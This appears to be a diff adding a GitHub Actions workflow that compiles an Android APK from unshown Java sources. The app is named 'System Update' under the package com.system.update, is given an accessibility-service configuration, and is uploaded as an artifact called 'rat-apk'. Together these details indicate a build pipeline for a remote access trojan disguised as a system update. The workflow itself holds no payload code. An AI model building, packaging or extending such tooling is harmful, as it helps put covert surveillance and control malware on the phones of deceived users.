@@ -1,0 +1,143 @@
+name: Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Show Repository Files
+        run: |
+          echo "===== ROOT FILES ====="
+          ls -la
+          echo "===== JAVA FILES ====="
+          find . -maxdepth 1 -name "*.java" -type f
+          echo "===== XML FILES ====="
+          find . -maxdepth 1 -name "*.xml" -type f
+
+      - name: Create Project Structure
+        run: |
+          rm -rf app
+          mkdir -p app/src/main/java/com/system/update
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          
+          for f in $(find . -maxdepth 1 -name "*.java" -type f); do
+            echo "Copying $f"
+            cp "$f" app/src/main/java/com/system/update/
+          done
+          
+          if [ -f "AndroidManifest.xml" ]; then
+            cp AndroidManifest.xml app/src/main/
+          fi
+          
+          if [ -f "accessibility_config.xml" ]; then
+            cp accessibility_config.xml app/src/main/res/xml/
+          fi
+          
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Verify Files
+        run: |
+          echo "===== JAVA FILES IN APP ====="
+          ls -la app/src/main/java/com/system/update/
+          echo "===== COUNT ====="
+          ls app/src/main/java/com/system/update/*.java | wc -l
+
+      - name: Create Gradle Files
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          EOF
+
+          cat > build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application' version '8.1.4' apply false
+          }
+          EOF
+
+          cat > gradle.properties << 'EOF'
+          android.useAndroidX=true
+          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
+          EOF
+
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+          android {
+              namespace 'com.system.update'
+              compileSdk 34
+              defaultConfig {
+                  applicationId "com.system.update"
+                  minSdk 24
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+          dependencies { }
+          EOF
+
+      - name: Setup Gradle 8.2
+        uses: gradle/actions/setup-gradle@v3
+        with:
+          gradle-version: 8.2
+
+      - name: Build APK
+        run: gradle assembleDebug --no-daemon --stacktrace
+
+      - name: Verify APK
+        run: |
+          echo "===== APK FILE ====="
+          ls -la app/build/outputs/apk/debug/
+          echo "===== APK SIZE ====="
+          du -h app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Upload APK
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: rat-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+          if-no-files-found: error
